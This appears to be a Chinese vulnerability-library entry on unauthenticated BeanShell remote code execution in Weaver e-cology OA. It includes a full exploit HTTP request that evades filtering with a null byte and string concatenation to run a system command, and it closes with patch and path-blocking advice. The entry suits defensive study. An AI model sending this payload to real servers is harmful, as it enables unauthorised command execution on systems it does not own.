---
source: "白阁文库 BaizeSec/bylibrary"
title: "泛微e-cology BshServlet未授权BeanShell代码执行"
product: "泛微e-cology"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "没有明确版本；BeanShell入口暴露及过滤绕过"
prerequisites: "声称未认证"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEOA%20Bsh%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
id: "vw-eff06ba9926720cd25e235bb"
entity_id: "ve-eff06ba9926720cd25e235bb"
schema_version: "1"
---

# 泛微e-cology BshServlet未授权BeanShell代码执行

## 条目说明

- 对象与具体问题：泛微e-cology；BshServlet未授权BeanShell代码执行
- 版本、配置及部署条件：没有明确版本；BeanShell入口暴露及过滤绕过
- 认证与权限前提：声称未认证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 请求完整但无成功响应；eval空字节/字符串拆分绕过未解释

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

---
title: '泛微OA Bsh 远程代码执行漏洞'
date: Thu, 17 Sep 2020 07:40:43 +0000
draft: false
tags: ['白阁-武器库']
---

##### 详情

泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行, 漏洞等级严重

##### 利用方式

```http
POST /weaver/bsh.servlet.BshServlet HTTP/1.1
Host: xxxxxxxx:8088
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 98
Content-Type: application/x-www-form-urlencoded

bsh.script=eval%00("ex"%2b"ec(\"whoami\")");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw 
```

> 请求长度说明：原资料 Content-Length 为 98；保留原始标头；其数值未据实际请求体重新计算或验证。

防护方法 1.及时更新泛微补丁 2.拦截/weaver/bsh.servlet.BshServlet目录的访问


---

> 来源：白阁文库 BaizeSec/bylibrary
